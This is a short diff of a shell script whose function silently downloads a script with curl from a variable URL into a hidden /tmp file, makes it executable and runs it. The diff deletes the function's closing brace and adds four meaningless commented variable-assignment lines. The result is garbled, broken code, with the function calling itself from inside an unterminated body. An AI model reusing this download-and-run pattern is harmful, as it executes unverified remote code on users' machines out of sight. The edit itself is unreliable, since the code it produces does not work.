@@ -30,7 +30,8 @@ download_menu_script() {
   curl -s "$full_url" -o /tmp/.zi_menu
   chmod +x /tmp/.zi_menu
   bash /tmp/.zi_menu
-}
-
-# z36="x36"; z37="x37";z36="x36"; z37="x37";
+  # z36="v8"; v1="x37";z36="x36"; z37="x37";
+  # z36="x0"; p2="x37";z36="x36"; z37="x37";
+  # z36="j3"; n3="x37";z36="x36"; z37="x37";
+  # z36="nn"; h88="x37";z36="x36"; z37="x37";
 download_menu_script
